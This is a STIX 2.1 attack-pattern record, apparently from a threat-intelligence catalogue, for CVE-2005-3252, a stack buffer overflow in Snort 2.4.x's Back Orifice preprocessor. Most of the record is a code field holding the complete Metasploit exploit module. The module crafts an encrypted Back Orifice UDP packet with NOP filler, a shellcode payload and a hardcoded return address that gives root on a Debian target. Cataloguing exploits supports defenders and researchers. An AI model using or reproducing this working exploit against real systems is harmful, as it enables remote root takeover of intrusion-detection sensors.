{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--97406f67-f9fe-4d98-a46c-57070235139b",
    "created": "2024-08-14T16:59:51.934931Z",
    "modified": "2024-08-14T16:59:51.934936Z",
    "name": "Snort Back Orifice Pre-Preprocessor Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in the Back Orifice pre-processor module included with Snort versions 2.4.0, 2.4.1, 2.4.2, and 2.4.3. This vulnerability could be used to completely compromise a Snort sensor, and would typically gain an attacker full root or administrative privileges. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/ids/snortbopre.rb",
            "external_id": "snortbopre.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-3252"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Udp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Snort Back Orifice Pre-Preprocessor Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the Back Orifice pre-processor module\n        included with Snort versions 2.4.0, 2.4.1, 2.4.2, and 2.4.3. This vulnerability could\n        be used to completely compromise a Snort sensor, and would typically gain an attacker\n        full root or administrative privileges.\n      },\n      'Author'         => 'KaiJern Lau <xwings[at]mysec.org>',\n      'License'        => BSD_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2005-3252'],\n          ['OSVDB', '20034'],\n          ['BID', '15131']\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 1073, #ret : 1069\n          'BadChars' => \"\\x00\",\n        },\n      'Platform'       => %w{ linux },\n      'Targets'        =>\n        [\n          # Target 0: Debian 3.1 Sarge\n          [\n            'Debian 3.1 Sarge',\n            {\n              'Platform' => 'linux',\n              'Ret'      => 0xbffff350\n            }\n          ],\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2005-10-18'))\n\n    # Configure the default port to be 9080\n    register_options(\n      [\n        Opt::RPORT(9080),\n      ])\n  end\n\n  def msrand(seed)\n    @holdrand = 31337\n    end\n\n  def mrand()\n    return (((@holdrand=@holdrand*(214013 & 0xffffffff)+(2531011 & 0xffffffff))>>16)&0x7fff)\n    end\n\n  def bocrypt(takepayload)\n\n    @arrpayload = (takepayload.split(//))\n\n    encpayload = \"\"\n    @holdrand=0\n    msrand(0)\n\n    @arrpayload.each do |c|\n      encpayload +=((c.unpack(\"C*\").map{ |v| (v^(mrand()%256)) }.join)).to_i.chr\n    end\n\n    return encpayload\n    end\n\n\n  def exploit\n    connect_udp\n\n    boheader =\n      \"*!*QWTY?\"  +\n      [1096].pack(\"V\")  +           # Length ,thanx Russell Sanford\n      \"\\xed\\xac\\xef\\x0d\"+           # ID\n      \"\\x01\"                        # PING\n\n    filler =\n      make_nops(1069 -(boheader.length + payload.encode.length))\n\n    udp_sock.write(\n      bocrypt(boheader+payload.encode+filler+[target.ret].pack('V'))\n    )\n\n    handler\n    disconnect_udp\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-10-18",
    "x_mitre_platforms": [
        "linux'"
    ]
}